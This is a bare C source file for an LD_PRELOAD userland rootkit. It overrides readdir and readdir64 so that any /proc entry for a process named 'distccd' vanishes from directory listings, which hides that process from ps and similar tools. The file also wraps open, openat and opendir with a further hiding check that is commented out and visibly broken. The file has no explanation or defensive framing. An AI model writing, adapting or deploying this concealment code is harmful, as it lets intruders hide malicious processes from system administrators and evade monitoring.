#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

#define TGT_PROC   "distccd"
#define TGT_UNLIST 1
#define TGT_UNOPEN 1

#define BUF_SIZE   256
#define FD_MAX     10
#define TGT_FS     "/proc"
#define FD_DIR     "/proc/self/fd/"

static int get_dir_proc(DIR * const dirp, const char * const pid)
{
	char buf[BUF_SIZE];
	{
		char path[sizeof(FD_DIR) - 1 + FD_MAX] = FD_DIR;
		const int dir_fd = dirfd(dirp);
		if (dir_fd == -1) return 0;
		snprintf(path + sizeof(FD_DIR) - 1, FD_MAX, "%d", dir_fd);
		{
			const ssize_t rlc = readlink(path, buf, BUF_SIZE);
			if (!rlc) return 0;
			buf[rlc] = 0;
		}
	}
	if (strncmp(buf, TGT_FS, sizeof(TGT_FS))) return 0;
	snprintf(buf + sizeof(TGT_FS) - 1, BUF_SIZE - sizeof(TGT_FS) - 1, "/%s/comm", pid);
	{
		const int fd = open(buf, O_RDONLY);
		if (fd == -1) return 0;
		{
			const ssize_t rdc = read(fd, buf, BUF_SIZE);
			close(fd);
			if (!rdc) return 0;
			buf[rdc - 1] = 0;
		}
	}
	return !strncmp(buf, TGT_PROC, sizeof(TGT_PROC));
}
#if TGT_UNLIST
#define DECLARE_READDIR(dirent, readdir)                                             \
static struct dirent* (*o_##readdir)(DIR * const) = NULL;                            \
struct dirent* readdir(DIR * const dirp)                                             \
{                                                                                    \
	if (!o_##readdir)                                                                \
		o_##readdir = (struct dirent *(*)(DIR * const)) dlsym(RTLD_NEXT, #readdir);  \
	do {                                                                             \
		struct dirent * const dir = o_##readdir(dirp);                               \
		if (!dir || !get_dir_proc(dirp, dir->d_name)) return dir;                    \
	} while (1);                                                                     \
}
DECLARE_READDIR(dirent64, readdir64)
DECLARE_READDIR(dirent, readdir)
#endif
#if TGT_UNOPEN
#include <stdlib.h>
#include <limits.h>
#include <errno.h>
#include <stdarg.h>

//static int open_check(const char * pathname)
//{
//	char apath[PATH_MAX];
//	if (!strncmp(apath, TGT_FS, sizeof(TGT_FS) - 1) || apath[sizeof(TGT_FS)] != '/') return 0;
//	const char * end_dir = strchr(apath + sizeof(TGT_FS) + 1, '/');
//	char comm_path[PATH_MAX];
//	strncpy(comm_path, apath, end_dir - apath);
//	strcat(comm_path, "comm");
//	{
//		const int fd = open(comm_path, O_RDONLY);
//		if (fd == -1) return 0;
//		{
//			const ssize_t rdc = read(fd, comm_path, BUF_SIZE);
//			close(fd);
//			if (!rdc) return 0;
//			comm_path[rdc - 1] = 0;
//		}
//	}
//	return !strncmp(comm_path, TGT_PROC, sizeof(TGT_PROC));
//}

static int (*o_openat)(int, const char *, int, ...) = NULL;
int openat(int dirfd, const char * pathname, int flags, ...)
{
	if (!o_openat)
		o_openat = (int(*)(int, const char *, int, ...)) dlsym(RTLD_NEXT, "openat");
	//if (open_check(pathname)) {
	//	errno = ENOENT;
	//	return -1;
	//}
	mode_t mode     = 0;
	int    mode_set = 0;
	if ((flags & O_CREAT) || (flags & O_TMPFILE) == O_TMPFILE) {
		va_list ap;
		va_start(ap, flags);
		mode = va_arg(ap, mode_t);
		va_end(ap);
		mode_set = 1;
	}
	if (mode_set) return o_openat(dirfd, pathname, flags, mode);
	return o_openat(dirfd, pathname, flags);
}
static int (*o_open)(const char *, int, ...) = NULL;
int open(const char * pathname, int flags, ...)
{
	if (!o_open)
		o_open = (int(*)( const char *, int, ...)) dlsym(RTLD_NEXT, "open");
	//if (open_check(pathname)) {
	//	errno = ENOENT;
	//	return -1;
	//}
	mode_t mode     = 0;
	int    mode_set = 0;
	if ((flags & O_CREAT) || (flags & O_TMPFILE) == O_TMPFILE) {
		va_list ap;
		va_start(ap, flags);
		mode = va_arg(ap, mode_t);
		va_end(ap);
		mode_set = 1;
	}
	if (mode_set) return o_open(pathname, flags, mode);
	return o_open(pathname, flags);
}
static DIR * (*o_opendir)(const char *) = NULL;
DIR * opendir(const char * pathname)
{
	if (!o_opendir)
		o_opendir = (DIR *(*)(const char *)) dlsym(RTLD_NEXT, "opendir");
	//if (open_check(pathname)) {
	//	errno = ENOENT;
	//	return -1;
	//}
	return o_opendir(pathname);
}
#endif
